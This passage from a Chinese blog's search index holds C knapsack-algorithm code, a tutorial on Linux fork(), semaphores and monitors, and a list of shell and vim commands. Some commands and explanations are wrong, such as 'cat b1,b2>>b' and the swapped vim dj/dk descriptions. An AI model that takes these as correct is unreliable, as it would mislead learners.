printf("\t\t\t选择的物品有:\n"); for(i=0;i&lt;n;i++)&#123; if(x[i]==1)&#123; printf("\t\t\t第%d个物品，重量为%d,价格为%d\n",i+1,w[i],p[i]); &#125; &#125; &#125;void dynamic()&#123; int i,j,cw,c,sw,sp,a[MAX],b[MAX],g[MAX][10*MAX]; printf("\t\t\t输入物品个数 n:"); scanf("%d",&amp;n); printf("\t\t\t输入背包重量 c:"); scanf("%d",&amp;c); for(i=1;i&lt;=n;i++)&#123; printf("\t\t\t输入第 %d个物品的重量,价值:",i); printf("\n\t\t\t"); scanf("%d,%d",&amp;b[i],&amp;a[i]); &#125; for(j=0;j&lt;=c;j++) if(j&gt;=b[1]) g[1][j]=a[1]; else g[1][j]=0; for (i = 2; i &lt;=n; i++) for (j = 0; j &lt;= c; j++) if(j&gt;=b[i]&amp;&amp;g[i-1][j]&lt;g[i-1][j-b[i]]+a[i]) g[i][j]=g[i-1][j-b[i]]+a[i]; else g[i][j]=g[i-1][j]; cw=c; printf("\t\t\tc=%d\n",c ); printf("\t\t\t选择的物品有:\n"); for(sp=0,sw=0,i=n;i&gt;=2;i--) if(g[i][cw]&gt;g[i-1][cw])&#123; cw-=b[i]; sw+=b[i]; sp+=a[i]; printf("\t\t\t第%2d个物品，重量为 %3d 价格为%3d\n",i,b[i],a[i]); &#125; if(g[n][c]-sp==a[i])&#123; sw+=b[i]; sp+=a[i]; printf("\t\t\t第%2d个物品，重量为%3d 价格为 %3d\n",1,b[1],a[1] ); &#125; printf("\t\t\t重量=%d , 价格=%d\n",sw,sp );&#125;void compareTime()&#123; QueryPerformanceFrequency(&amp;nFreq); //传出精度 double cost1_time=0.0,cost2_time=0.0,cost3_time=0.0; int i,j,k,tw; int b[MAX],temp[MAX]; int temp_w,temp_v,maxv; int g[MAX][10*MAX]; int cw; printf("|-------------------------------------------------------------------------|\n"); printf("\t|物品个数|背包重量|蛮力算法\t|递归算法\t|动态规划算法|\n"); for(n=5;n&lt;=100;n+=5)&#123; for(tw=20;tw&lt;=400;tw+=20)&#123; for(k=0;k&lt;n;k++)&#123; p[k]=getNum(tw/2); w[k]=getNum(tw/2); &#125; QueryPerformanceCounter(&amp;nBeginTime); //开始数据 maxv=0; for (i=0;i&lt;pow(2,n);i++) &#123; for (j=0;j&lt;n;j++) &#123; b[j] = 0; &#125; conversion(i,b); temp_v = 0; temp_w = 0; for (j=0;j&lt;n;j++) &#123; if (b[j]==1) &#123; temp_w = temp_w+w[j]; temp_v = temp_v + p[j]; &#125; &#125; if ((temp_w &lt;= tw)&amp;&amp;(temp_v&gt;maxv)) &#123; for (j=0;j&lt;n;j++) &#123; temp[j] = 0; &#125; maxv = temp_v; for (j=0;j&lt;n;j++) &#123; temp[j] = b[j]; &#125; &#125; &#125; QueryPerformanceCounter(&amp;nEndTime); //执行完数据 cost1_time=(double)(((nEndTime.QuadPart-nBeginTime.QuadPart) *1000.0) /nFreq.QuadPart); //相减得到数据除精度 QueryPerformanceCounter(&amp;nBeginTime); Make(n-1,tw); QueryPerformanceCounter(&amp;nEndTime); cost2_time=(double)(((nEndTime.QuadPart-nBeginTime.QuadPart) *1000.0) /nFreq.QuadPart); QueryPerformanceCounter(&amp;nBeginTime); for(j=0;j&lt;=tw;j++) if(j&gt;=w[1]) g[1][j]=p[1]; else g[1][j]=0; for (i = 2; i &lt;=n; i++) for (j = 0; j &lt;= tw; j++) if(j&gt;=w[i]&amp;&amp;g[i-1][j]&lt;g[i-1][j-w[i]]+p[i]) g[i][j]=g[i-1][j-w[i]]+p[i]; else g[i][j]=g[i-1][j]; cw=tw; QueryPerformanceCounter(&amp;nEndTime); cost3_time=(double)(((nEndTime.QuadPart-nBeginTime.QuadPart) *1000.0) /nFreq.QuadPart); printf("\t|%3d\t|%3d\t|%12g\t|%11g\t|%11g|\n",n,tw,cost1_time,cost2_time,cost3_time); &#125; &#125; printf("|------------------------------------------------------------------|\n");&#125;int main()&#123; int a=4,b=5,d=1; while(a!=3)&#123; printf("\t\t\t1.算法检测\n"); printf("\t\t\t2.算法时间复杂度比较\n"); printf("\t\t\t3.退出\n"); printf("\t\t\t请选择:"); scanf("\t\t\t%d",&amp;a); printf("\n"); switch(a)&#123; case 1: while(b!=4)&#123; printf("\t\t\t1.蛮力算法\n"); printf("\t\t\t2.递归算法\n"); printf("\t\t\t3.动态规划算法\n"); printf("\t\t\t4.退出\n"); printf("\t\t\t请选择:"); scanf("\t\t\t%d",&amp;b); printf("\n"); switch(b)&#123; case 1: d=1; while(d!=2)&#123; force(); printf("\t\t\t1.继续蛮力算法\n"); printf("\t\t\t2.退出\n"); printf("\t\t\t请选择:"); scanf("\t\t\t%d",&amp;d); printf("\n"); &#125; break; case 2: d=1; while(d!=2)&#123; recursive(); printf("\t\t\t1.继续递归算法\n"); printf("\t\t\t2.退出\n"); printf("\t\t\t请选择:"); scanf("\t\t\t%d",&amp;d); printf("\n"); &#125; break; case 3: d=1; while(d!=2)&#123; dynamic(); printf("\t\t\t1.继续动态规划算法\n"); printf("\t\t\t2.退出\n"); printf("\t\t\t请选择:"); scanf("\t\t\t%d",&amp;d); printf("\n"); &#125; break; case 4: break; default: printf("\t\t\t请重新选择:\n"); break; &#125; &#125; break; case 2: d=1; while(d!=2)&#123; compareTime(); printf("\t\t\t1.继续时间复杂度比较\n"); printf("\t\t\t2.退出\n"); printf("\t\t\t请选择:"); scanf("\t\t\t%d",&amp;d); printf("\n"); &#125; break; case 3: break; default: printf("\t\t\t请重新选择:\n"); break; &#125; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux父子进程]]></title>
    <url>%2F2016%2F12%2F30%2Ffirst%2F</url>
    <content type="text"><![CDATA[进程基本概念我说的肯定跟书上那些概念不一样，就我对进程的理解，当你附加给他代码，数据和分配给进程的资源，那么他就是一个进程，比如在你进入linux系统时，你进入的就是一个大的进程，有控制显示器的声音的键盘的什么的。这只是我的理解。fork()函数通过系统调用创建一个与原来进程几乎完全相同的进程，也就是两个进程可以做相同的事，但如果初始参数或这传入的变量不同，两个进程也可以做不同的事。一个进程调用fork()函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的进程中。示例：12345678910111213141516171819#include &lt;stdio.h&gt; int main () &#123; pid_t fpid; //fpid表示fork函数返回的值 int count=0; fpid=fork(); if (fpid &lt; 0) printf("error in fork!"); else if (fpid == 0) &#123; printf("我是子进程, 我的进程号PID是 %d/n",getpid()); count++; &#125; else &#123; printf("我是父进程，我的进程号PID是 %d/n",getpid()); count++; &#125; printf("统计结果是: %d/n",count); return 0; &#125; 运行结果：我是子进程，我的进程号PID是2605统计结果是:1我是父进程，我的进程号PID是2604统计结果是:1在语句fpid=fork()之前，只有一个进程在执行这段代码，但在这条语句之后，就变成两个进程在执行了，这两个进程的几乎完全相同，将要执行的下一条语句都是if(fpid&lt;0)然后一直执行到结束，如果你要想某些代码在子进程运行，某些代码在父进程可以运行，那么fpid是个好东西，因为在父进程他返回的是子进程的PID在子进程返回的是0。没有创建成功返回负数。说一下原理：为什么两个进程的fpid不同呢，这与fork函数的特性有关。fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值。 在父进程中，fork返回新创建子进程的进程ID 在子进程中，fork返回0； 如果出现错误，fork返回一个负值在fork函数执行完毕后，如果创建新进程成功，则出现两个进程，一个是子进程，一个是父进程。在子进程中，fork函数返回0，在父进程中fork返回新创建子进程的进程PID。fpid的值为什么在父子进程中不同。“其实就相当于链表，进程形成了链表，父进程的fpid(p 意味point)指向子进程的进程id, 因为子进程没有子进程，所以其fpid为0.fork出错可能有两种原因: 当前的进程数已经达到了系统规定的上限，这时errno的值被设置为EAGAIN。 系统内存不足，这时errno的值被设置为ENOMEM。创建新进程成功后，系统中出现两个基本完全相同的进程，这两个进程执行没有固定的先后顺序，哪个进程先执行要看系统的进程调度策略。每个进程都有一个独特（互不相同）的进程标识符（process ID），可以通过getpid（）函数获得，还有一个记录父进程pid的变量，可以通过getppid（）函数获得变量的值。fork进阶1234567891011121314151617#include &lt;stdio.h&gt; int main(void) &#123; int i=0; printf("i son/pa ppid pid fpid/n"); //ppid指当前进程的父进程pid //pid指当前进程的pid, //fpid指fork返回给当前进程的值 for(i=0;i&lt;2;i++)&#123; pid_t fpid=fork(); if(fpid==0) printf("%d child %4d %4d %4d/n",i,getppid(),getpid(),fpid); else printf("%d parent %4d %4d %4d/n",i,getppid(),getpid(),fpid); &#125; return 0; &#125; 运行结果是: i son/pa ppid pid fpid 0 parent 2043 3224 3225 0 child 3224 3225 0 1 parent 2043 3224 3226 1 parent 3224 3225 3227 1 child 1 3227 0 1 child 1 3226 0这个代码很有意思.首先进入for循环，i=0，执行fork()函数，这时候就创建了一个子进程，继续往下看，这时候就有两个进程在跑这段程序了，他们共有的初始变量是i=0，但是记住这个变量是复制给子进程的。接着父子进程都要去进行if判断，如果是子进程那么if(pid==0)判断通过，当然进程间是由系统调度的，所以他们没有先后顺序，按照我分析的来，所以输出0 child 3224 3225 0第一个说明他是被3224进程创建的，第二个说明他本身的进程号是3225，第三个说明他没有子进程fpid=0，父进程pid==0是不通过的那么他会执行else，输出0 parent 2043 3224 3225同样的2043是它的父进程，3224是当前进程，3225是他创建的子进程，你们可以看到，子进程输出的父进程是3224，那么他们就是这个关系。接着他们会同时执行第二次循环，这是i=1，那么父进程又要开一个子进程，而原来由父进程开出来的子进程，现在也即将要变成父进程，开出一个子进程，是不是有点乱了，呜呜。我画个图吧~1234567 父进程 / \ / \ 父进程 子进程 / \ / \ / \ / \父 子子(父)子 用bash画的，可能不太好看，简单说一下吧！这每一层代表的是每一个阶段的状态，并不是父进程创建了父进程和子进程，下面同样的。然后就按照这个说吧！现在父进程再开个子进程，就是最后一行的第一个子进程，同时那个要变成父进程的子进程也开了一个子进程。这时候就有四个进程在运行了，这里就有两种情况了，如果两个父进程先执行完，父进程就会死亡，那么子进程里面的父进程PID号怎么办呢？这时候子进程的父进程就会变为1.先执行两个父进程，那么就先输出1 parent 2043 3224 3226这个是最老的进程，因为他的父进程就是创建他的进程。而3224是他的进程号，3226是目前创建的子进程，而原来那个子进程已经不需要他去标识了。第二个父进程就是原来的子进程，输出的是1 parent 3224 3225 3227他的父进程的PID还是在的为3224,3225是他的进程号ID，而3227是他目前创建的新进程PID作为标识，而这时候会有进程的死亡，所以两个子进程的父进程PID变为1，输出1 child 1 3227 0 1 child 1 3226 0我们可以用链表来表示那个四层关系的2043-&gt;3224-&gt;3225-&gt;3227在p3224和p3225执行完第二个循环后，main函数就该退出了，也即进程该死亡了，因为它已经做完所有事情了。p3224和p3225死亡后，p3226，p3227就没有父进程了，这在操作系统是不被允许的，所以p3226，p3227的父进程就被置为p1了，p1是永远不会死亡的这个程序总共产生了三个子进程，执行了6此printf操作。这基本就是子父进程的创建和应用。 简单说一下getpid(),getppid(),fork()函数返回值getpid()返回当前进程的PID，getppid() 放回当前进程的父进程的PID，fork()会返回两个值，在父进程返回他创建的子进程的pid，在子进程返回0，这就解决的不管你是什么进程创建的子进程，我都能唯一的去识别两者的关系。 进程间的互斥和同步1、进程之间有时候会对同一个数据进行操作，或许这个数据是两个进程都要修改的(互斥)，或许这个数据是一个触发点(同步)。进程互斥是进程之间发生的一种间接性作用，一般是程序不希望的。通常的情况是两个或两个以上的进程需要同时访问某个共享变量。我们一般将发生能够问共享变量的程序段称为临界区。两个进程不能同时进入临界区，否则就会导致数据的不一致，产生与时间有关的错误。解决互斥问题应该满足互斥和公平两个原则，即任意时刻只能允许一个进程处于同一共享变量的临界区，而且不能让任一进程无限期地等待。进程同步是进程之间直接的相互作用，是合作进程间有意识的行为，典型的例子是公共汽车上司机与售票员的合作。只有当售票员关门之后司机才能启动车辆，只有司机停车之后售票员才能开车门。司机和售票员的行动需要一定的协调。同样地，两个进程之间有时也有这样的依赖关系，因此我们也要有一定的同步机制保证它们的执行次序。2、根据信号量来做进程间的同步和互斥。最典型的就是PV操作：PV操作是由P操作原语与V操作原语组成，对信号量进程操作。互斥PV操作：P(S) ①将互斥的信号量的值S减1(一般取变量名为S，因为S痛sign) ②如果S==0，执行该进程，否则该进程就进入等待状态，排入等待队列。V(S) ①将信号量S=S+1 ②如果S&gt;0,执行该进程，否则释放队列中第一个等待信号量的进程。科普一下：什么是信号量?信号量的数据结构为一个值和一个指针，指针指向等待该信号量的下一个进程。信号量的值与相应资源的使用情况有关。当它的值大于0时，表示当前可用资源的数量；当它的值小于0时，其绝对值表示等待使用该资源的进程个数。接下来我又要吐槽一下了，一般网上的人都说信号量S=0时，S表示可用资源什么的。其实是这样的，互斥的信号量S初始一般为1的，他要运行临界区的时候，应该是先S–再判断，如果没有执行，则他再返回S++，这就是为什么S初始信号量为1，而判断的是S==0。后面我会举一个实例。使用PV操作实现进程互斥需要注意的是:（1）每个程序中用户实现互斥的P、V操作必须成对出现，先做P操作，进临界区，后做V操作，出临界区。若有多个分支，要认真检查其成对性。（2）P、V操作应分别紧靠临界区的头尾部，临界区的代码应尽可能短，不能有死循环。（3）互斥信号量的初值一般为1。 同步PV操作:PV操作是典型的同步机制之一。用一个信号量与一个消息联系起来，当信号量的值为0时，表示期望的消息尚未产生；当信号量的值非0时，表示期望的消息已经存在。用PV操作实现进程同步时，调用P操作测试消息是否到达，调用V操作发送消息。这个跟互斥差不多，只不过这个初始值为0，这些我觉得都是可控的，只不过一般来说，你一辆车一开始肯定是空的，这个视情况而定吧。使用PV操作实现进程同步需要注意的是:（1）分析进程间的制约关系，确定信号量种类。在保持进程间有正确的同步关系情况下，哪个进程先执行，哪些进程后执行，彼此间通过什么资源（信号量）进行协调，从而明确要设置哪些信号量。（2）信号量的初值与相应资源的数量有关，也与P、V操作在程序代码中出现的位置有关。（3）同一信号量的P、V操作要成对出现，但它们分别在不同的进程代码中。举一个我觉得理解起来还不错的例子吧。先上代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;windows.h&gt;#define MAX 20//厅内最大能容纳的人数int spys=1;//售票员的私有信号量int spy;//选择售票员的人数，最多只能有两个int ck=0;//厅内购票者私有信号量int n=MAX;int x;//每次进入售票厅内的人数int P1();//定义P操作函数,一个售票员执行的过程int P2();//定义p操作，两个售票员执行该过程int j=0;//人多时，减少的人数int V1();//V操作函数，一个售票窗口时购买者执行的过程int V2();//V操作函数，两个售票窗口时购买者执行的过程void Hello();//输出客套语句void Introduce();//本客运站人员介绍int main()&#123; Introduce();//初始化控制台颜色 printf("请输入今天上班的售票员人数：（最多2位）：\n"); scanf("%d",&amp;spy);//输入售票员人数 switch(spy)&#123; case 0:&#123; printf("sorry！由于今天假日，所以售票员不上班，请各位乘客改乘其他交通工具!\n"); break; &#125; case 1:&#123; printf("今天就一个窗口售票哦！请乘客们排成一队！谢谢合作!\n"); P1(); break; &#125; case 2:&#123; printf("今天有两个售票窗口啦！请乘客们按顺序排成两队！谢谢合作\n"); P2(); break; &#125; default:&#123; printf("本站员工有限，没有多余员工哦！"); break; &#125; &#125; return 0;&#125;int P1() //一个售票窗口时执行的过程&#123; spys--;//p操作改变售票员的信号量 if(spys==0) &#123; Sleep(2000); printf("20B506客运站欢迎各位乘客来乘坐本公司的汽车！祝你旅途愉快！\n"); Sleep(2000); n--; Hello(); Sleep(3000); printf("当前购买者完成购票，请下一位购票者就绪\n"); Sleep(2000); printf("当前售票厅内人数为%d\n",n); ck++;//v操作改变厅内购票者信号量 &#125; else spys++; V1(); return 0;&#125;int V1()//顾客的执行过程&#123; ck--;//改变顾客进入厅内的信号量操作 if(ck==0) &#123; printf("请厅外的购票者排按顺序进入购票厅内（最多能进入人数为：%d）：\n",MAX-n); scanf("%d",&amp;x); n=n+x; printf("售票厅内人数为%d",n); if(n&gt;MAX)&#123; printf("人数太多了，站不住脚呀！请出去一些人到售票厅外等候吧！\n"); printf("请输入出去的人数：\n"); scanf("%d",&amp;j); while(j&gt;n-MAX)&#123; printf("还可以再进来些人哦！！"); printf("请在厅外等候的乘客进入售票厅内吧：\n"); scanf("%d",&amp;j); &#125; n=n-j; printf("售票厅内人数为%d",n); &#125; if(n==0) &#123; printf("可以下班了，售票员们，你们辛苦了\n"); return 0; &#125; &#125; //printf("\n厅内排队人数为%d，请厅外购票者们耐心等候，谢谢合作\n",n-1); if(n&gt;=20) printf("已经达到最大人数，请厅外的乘客耐心等候！谢谢合作\n"); else printf(",本售票厅内可容纳最多20人数！,还可再进入%d人。\n",MAX-n); Sleep(2000); spys++;//改变售票员的信号量 P1(); return 0;&#125;int P2() //两个售票窗口时执行的过程&#123; spys--;//改变售票员的信号量 if(spys==0) &#123; Sleep(2000); printf("20B506客运站欢迎各位乘客来乘坐本公司的汽车！祝你旅途愉快！\n"); Sleep(2000); n=n-2; Hello(); Sleep(3000); printf("当前购买者完成购票，请下一位购票者就绪\n"); Sleep(2000); printf("当前售票厅内人数为%d\n",n); ck++;//改变购票者的信号量 &#125; else spys++; V2(); return 0;&#125;int V2()//顾客的执行过程&#123; ck--;//相当于p操作 if(ck==0) &#123; printf("请厅外的购票者排按顺序进入购票厅内（最多能进入人数为：%d）：\n",MAX-n); scanf("%d",&amp;x); n=n+x; printf("售票厅内人数为%d",n); if(n&gt;MAX)&#123; printf("人数太多了，站不住脚呀！请出去一些人到售票厅外等候吧！\n"); printf("请输入出去的人数：\n"); scanf("%d",&amp;j); while(j&gt;n-MAX)&#123; printf("还可以再进来些人哦！！"); printf("请在厅外等候的乘客进入售票厅内吧：\n"); scanf("%d",&amp;j); &#125; n=n-j; printf("售票厅内人数为%d",n); &#125; if(n==0) &#123; printf("可以下班了，售票员们，你们辛苦了\n"); return 0; &#125; &#125; //printf("\n厅内排队人数为%d，请厅外购票者们耐心等候，谢谢合作\n",n-1); if(n&gt;=20) printf("已经达到最大人数，请厅外的乘客耐心等候！谢谢合作\n"); else printf(",本售票厅内可容纳最多20人数！,还可再进入%d人。\n",MAX-n); Sleep(2000); spys++;//执行v操作 P2(); return 0;&#125;void Hello()//say hello&#123; printf("售票厅内能容纳最多的人数为20人，请乘客们按顺序在厅外等候！谢谢合作！\n");&#125;void Introduce()&#123; system("color 4e"); printf("------------------------------欢迎来到20B506客运站-----------\n"); printf("-----站长：allen-----\n"); printf("----------副站长：vivien----\n"); printf("--------------售票员甲：jack ------\n"); printf("-------------------售票员乙：mike-----\n"); printf("----------------------------------我们的服务就是最好的承诺！\n"); printf("\n"); printf("\n"); printf("\n"); printf("\n"); printf("\n");&#125; 我们从这个里面分析同步和互斥的PV操作。在p1操作里面有一个–有一个++，很明显一个是控制互斥操作的信号量，一个是控制同步操作的信号量。那我再看看他们是控制那段临界区，而这段临界区完成了又改变了什么，我们就可以很清楚的了解到。那我们总结如下：存在互斥关系，一个售票员只能对应一个购票者，当售票员正在售票时，其他不能购票。存在同步关系，当厅内购票者人满时，只有售票员售票完成之后厅外的人才能进来。信号量如何体现呢？Sys信号量控制售票员是否被购票者占用若正在被占用时sys=0，初始为sys=1，下一个无法进行购票，当购票完成后sys++，则又能进行购票。Ck信号量控制，ck初始为0，售票是否完成，若完成++1，则厅外的人才能进来，进来后又—1.这就是同步互斥的PV操作。 管程信号量机制功能强大，但使用时对信号量的操作分散，不好控制，读写和维护都很困难。就像你做一个项目一样，没有一个良好的框架，东写一点，西写一点最后不知道变量是哪的哪的，难道最后再合成同一个文件的代码吗？当然不会。所以后来又提出了一种集中式同步进程–管程。其基本思想是将共享变量和对它们的操作集中在一个模块中，操作系统或并发程序就由这样的模块构成。这样模块之间联系清晰，便于维护和修改，易于保证正确性。管程作为一个模块，定义如下:monitor_name=MoNITOR;共享变量说明;define 本管程内部定义、外部可调用的函数名表;use 本管程外部定义、内部可调用的函数列表;内部定义的函数说明和函数体{ 共享变量初始化语句;(这就是我前面说的初始量都是视情况而定的)}管程的特性:(1)模块化。管程是一个基本程序单位，可以单独编译；(2)抽象数据类型。管程是种不仅有数据，而且有对数据的操作。(3)信息掩蔽。管程外可以调用管程内部定义的函数，但函数的具体实现外部不可见;对于管程中定义的共享变量的所有操作都局限在管程中，外部只能通过调用管程的某些函数来间接访问这些变量。因此管程有很好的封装性。为了保证共享变量的数据一致性，管程应互斥使用。管程通常是用于管理资源的，因此管程中有进程等待队列和相应的等待和唤醒操作。在管程入口有一个等待队列，称为入口等待队列。当一个已进入管程的进程等待时，就释放管程的互斥使用权；当已进入管程的一个进程唤醒另一个进程时，两者必须有一个退出或停止使用管程。在管程内部，由于执行唤醒操作，可能存在多个等待进程（等待使用管程），称为紧急等待队列，它的优先级高于入口等待队列。因此，一个进程进入管程之前要先申请，一般由管程提供一个enter过程；离开时释放使用权，如果紧急等待队列不空，则唤醒第一个等待者，一般也由管程提供外部过程leave。管程内部有自己的等待机制。管程可以说明一种特殊的条件型变量：var c:condition；实际上是一个指针，指向一个等待该条件的PCB队列。对条件型变量可执行wait和signal操作：（联系P和V； take和give）wait(c):若紧急等待队列不空，唤醒第一个等待者，否则释放管程使用权。执行本操作的进程进入C队列尾部；signal(c):若C队列为空，继续原进程，否则唤醒队列第一个等待者，自己进入紧急等待队列尾部。管程实例一：生产者消费者问题。生产者进程将产品放入某一缓冲区，消费者进程到此缓冲区中取产品。这个过程必须保证：1. 当缓冲区有剩余空间时，生产者才能在其中放入产品；2. 当缓冲区有数据时，消费者才能在其中取出产品。解决方案：使用管程机制来实现生产者和消费者之间的同步互斥问题1.假设有一基本管程monitor，提供了enter、leave、signal、wait等操作；2.条件变量notfull表示缓冲区不满，条件变量notempty表示缓冲区不空；3.缓冲区buff[0…n-1]用来存放产品，最大可放n件产品；4.定义整型变量count表示缓冲区当前的产品数，指针in指向缓冲区当前第一个空的位置，指针out指向缓冲区当前第一个不空的位置；5.定义过程add(ItemType item)12345678910add(ItemTypeitem) //生产者进程在缓冲区放入产品&#123; if(count==n) wait(notfull); //如果此时缓冲区已满，那么进程必须等待notfull，这意味着进程已经被阻塞到紧急队列里 buff[in]=item; //否则在第一个空的位置放入产品 in=(in+1)%n; //指针循环加1 count++; signal(notempty);//此时缓冲区已经多了一个产品，也就是说生产者进程去唤醒因取不到产品被阻塞的消费者进程&#125; 6.定义过程ItemType remove()12345678910ItemType remove() //消费者进程在缓冲区取出产品&#123; if(count==0) wait(notempty);//如果缓冲区没有产品,那么消费者必须等待notempty，也就是被阻塞到紧急队列中去 item=buff[out]; //消费者从第一个不空的位置取出产品 out=(out+1)%n; signal(notfull);//此时缓冲区多了一个空的单元，也就是消费者进程去唤醒因缓冲区已满而不能放入产品的生产者进程 return item;&#125; 7.生产者进程代码段1234567while(true)&#123; produce(&amp;item); //生成出一件产品 monitor. enter(); //进入管程 monitor. add(); //调用add方法，放入产品 monitor. leave(); //离开管程&#125; 8.消费者进程代码1234567while(true)&#123; monitor. enter(); item=monitor. remove(); //取出产品 monitor. leave(); consumer(&amp;item); //进行消费&#125; 管程实例二:读者—写者问题。现有一个缓冲区，有若干读者进程和若干写者进程。读者进程在缓冲区读数据，写者进程在缓冲区写入数据。这个过程必须保证：1. 读者进程之间不需要互斥；2.写者进程之间必须互斥，即当一个写者进程在缓冲区写入数据时，别的写者进程必须被阻塞；3. 读者进程和写者进程必须互斥，即当有读者进程在读数据，写者进程必须被阻塞，有写者进程在写数据时，读者进程必须被阻塞。解决方案：采用管程机制来解决读者—写者问题1.假设已经有一个基本管程Monitor提供了enter、leave、signal、wait等操作；2.定义条件变量r表示可以对缓冲区读，条件变量w表示可以对缓冲区写；3.定义布尔类型变量IsWriting表示当前有写者进程在缓冲区写数据；4.整型变量read_count表示读数据的个数；5.定义过程startRead()1234567void startRead()&#123; if(IsWriting) wait(r); //此时缓冲区有写者进程在写数据，那么读者进程等待r，也就是读者进程被阻塞到紧急队列中 read_count++; //否则，读出数据 signal(r); //唤醒被阻塞的读者进程&#125; 6.定义过程endRead()123456void endRead()&#123; read_count--; if(read_count= =0) signal(w); // 此时表示所有读者进程都已经读完数据，那么唤醒被阻塞的写 者进程&#125; 7.定义过程startWrite123456void startWrite()&#123; if(read_count!=0 || IsWriting) wait(w); //此时表示如果有读者进程存在或者其他写者进程存在，那么将要写数据的写者进程被阻塞 IsWriting=true;&#125; 8.定义过程endWrite()1234567void endWrite()&#123; IsWriting=false; if(r!=null) signal(r); //如果有读者进程存在，那么唤醒读者进程 else signal(w); //否则唤醒写者进程&#125; 9.读者进程代码段12345678while(true)&#123; Monitor. enter(); Monitor. startRead(); read(); Monitor. endRead(); Monitor. leave();&#125; 10.写者进程代码段12345678while(true)&#123; Monitor. enter(); Monitor. startWrite(); write(); Monitor. endWrite(); Monitor. leave();&#125; 这就是管程。]]></content>
      <categories>
        <category>Linux</category>
        <category>进程</category>
      </categories>
      <tags>
        <tag>系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux常用命令总结]]></title>
    <url>%2F2016%2F12%2F29%2Ffirst%2F</url>
    <content type="text"><![CDATA[常用命令一1、使用命令date、cal显示当前的时间和日期12$ date$ cal 2、显示当前工作目录路径1$ pwd 3、who显示当前用户1who 4、clear清除shell命令窗口1$ clear 5、echo打印出后面的字符1$ echo wo 6、切换到某个目录1$ cd /home/user 7、显示某个目录下所有文件目录的详细信息1$ ls -l/root 8、创建文件1$ touch ab 9、向文件ab写入”hello linux”1$ echo "hello linux"&gt;&gt;ab 10、查看ab里面的内容1$ cat ab 11、建立文件夹1$ mkdir test 12、将文件ab复制到文件夹test中命名为b11$ cp ab /test/b1 13、将文件ab剪切到文件夹test中命名为b21$ mv ab /test/b2 14、将文件b1,b2的内容合并成新的文件b1$ cat b1,b2&gt;&gt;b 15、删除文件或者文件夹及子文件子文件夹1$ rm -rf b1 b2 16、注销、重启、关机123$ reboot$ shutdown$ logout 常用命令二1、使用vim编辑器1$ vim hello.c 2、同时打开多个文件1$ vim file1 file2 file3 3、输入i进入编辑状态4、在vim窗口中打开一个新文件1:open file 5、在新窗口中打开文件1:split file 6、切换到下一个文件1:bn 7、切换到上一个文件1:bp 8、查看当前打开的文件列表，当前正在编辑的文件会用[]括起来1:args 9、打开远程文件1:e ftp://ip/abc.txt 10、按Esc或Ctrl+[左下角显示文件名或为空11、i在当前位置前插入，I在当前行首插入，a在当前位置后插入，A在当前行尾插入，o在当前行之后插入一行，O在当前行之前插入一行。12、/text 查找text,按n键查找下一个，按N键查找前一个。13、?text 查找text,反向查找，按n键查找下一个，按N键查找前一个。14、查找很长的词，如果一个词很长，键入麻烦，可以将光标移动到该词上，按*或#键即可以该单词进行搜索，相当于/搜索。而#命令相当于?搜索。15、h 左移一个字符，l 右移一个字符，这个命令很少用，一般用w代替。k 上移一个字符，j 下移一个字符。以上四个命令可以配合数字使用，比如20j就是向下移动20行，5h就是向左移动5个字符，在Vim中，很多命令都可以配合数字使用，比如删除10个字符10x，在当前位置后插入3个！，3a！，这里的Esc是必须的，否则命令不生效。16、Ctrl + e 向下滚动一行Ctrl + y 向上滚动一行Ctrl + d 向下滚动半屏Ctrl + u 向上滚动半屏Ctrl + f 向下滚动一屏Ctrl + b 向上滚动一屏17、撤销和重做u撤销，U撤销对整行的操作，Ctrl+r重做。18、删除命令x删除当前字符，3x删除当前光标开始向后三个字符，X删除当前字符的前一个字符。dh删除前一个字符，dd删除当前行，dj删除上一行，dk删除下一行，10d删除当前行开始的10行，d\$删除当前字符之后的所有字符(本行)相当于D，:1,10d删除1-10行，:11,\$d删除11行以及以后所有的行，:1,\$d删除所有行。19、拷贝和粘贴yy 拷贝当前行，nyy拷贝当前后开始的n行，比如2yy拷贝当前行及其下一行，p在当前光标后粘贴，shift+p在当前行粘贴，:1,10 co 20 将1-10行插入到第20行之后，:1,$ co $将整个文件复制一份到文件尾部,ddp交换当前行和其下一行，xp交换当前字符和其后一个字符。20、剪切正常模式下按v（逐字）或V（逐行）进入可视模式，然后用jklh命令移动即可选择某些行或字符，再按d即可剪切ndd 剪切当前行之后的n行。利用p命令可以对剪切的内容进行粘贴:1,10d 将1-10行剪切。利用p命令可将剪切后的内容进行粘贴。:1, 10 m 20 将第1-10行移动到第20行之后。21、退出:wq 保存并退出ZZ 保存并退出:q! 强制退出并忽略所有更改:e! 放弃所有修改，并打开原来文件。22、窗口:split或new 打开一个新窗口，光标停在顶层的窗口上:split file或:new file 用新窗口打开文件split打开的窗口都是横向的，使用vsplit可以纵向打开窗口。Ctrl+ww 移动到下一个窗口Ctrl+wj 移动到下方的窗口Ctrl+wk 移动到上方的窗口关闭窗口:close 最后一个窗口不能使用此命令，可以防止意外退出vim。:q 如果是最后一个被关闭的窗口，那么将退出vim。ZZ 保存并退出。关闭所有窗口，只保留当前窗口23、执行shell:!command:!ls 列出当前目录下文件:!perl -c script.pl 检查perl脚本语法，可以不用退出vim，非常方便。:!perl script.pl 执行perl脚本，可以不用退出vim，非常方便。:suspend或Ctrl - Z 挂起vim，回到shell，按fg可以返回vim。24、注释perl程序中#开始的行为注释，所以要注释某些行，只需在行首加入#3,5 s/^/#/g 